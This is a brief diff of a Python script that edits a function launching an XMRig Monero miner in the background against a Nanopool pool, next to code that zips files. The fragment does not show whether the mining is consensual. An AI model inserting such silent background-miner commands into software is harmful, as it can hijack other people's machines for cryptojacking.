@@ -677,7 +677,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=4 --background')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --threads=4 --background')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
